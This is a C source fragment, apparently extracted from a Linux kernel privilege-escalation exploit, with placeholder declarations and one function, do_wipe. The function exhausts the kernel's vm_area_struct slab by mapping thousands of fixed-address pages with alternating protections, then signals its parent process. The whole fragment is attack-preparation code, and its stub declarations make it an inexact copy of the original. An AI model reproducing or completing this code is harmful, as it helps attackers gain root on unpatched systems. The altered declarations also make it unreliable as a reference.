
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int MAP_ANONYMOUS ;
 int* MAP_FAILED ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 scalar_t__ PAGE_SIZE ;
 int PGD_SIZE ;
 int PROT_READ ;
 int SIGUSR1 ;
 int SLAB_PER_CHLD ;
 int SLAB_THRSH ;
 int fflush (int ) ;
 int get_slab_objs (char*) ;
 int getppid () ;
 int kill (int ,int ) ;
 int map_base ;
 int map_flags ;
 int old_esp ;
 int pause () ;
 int printf (char*,...) ;
 int stdout ;
 scalar_t__ sys_mmap2 (int,scalar_t__,int ,int,int ,int ) ;
 int val ;

inline void do_wipe()
{
int *r, c=0, left=0;

 __asm__("movl	%%esp, %0" : : "m"(old_esp) );

 old_esp = (old_esp - PGD_SIZE+1) & ~(PGD_SIZE-1);
 old_esp = map_base? map_base : old_esp;

 for(;;) {
  if(left<=0)
   left = get_slab_objs("vm_area_struct");
  if(left <= SLAB_THRSH)
   break;
  left--;

  map_flags ^= PROT_READ;
  old_esp -= PAGE_SIZE;
  r = (void*)sys_mmap2(old_esp, PAGE_SIZE, map_flags,
   MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 );
  if(MAP_FAILED == r)
   break;

  if(c>SLAB_PER_CHLD)
   break;
  if( (c%1024)==0 ) {
   if(!c) printf("\n");
   printf("\r    child %d VMAs %d", val, c);
   fflush(stdout);
  }
  c++;
 }
 printf("\r    child %d VMAs %d", val, c);
 fflush(stdout);
 kill(getppid(), SIGUSR1);
 for(;;) pause();
}
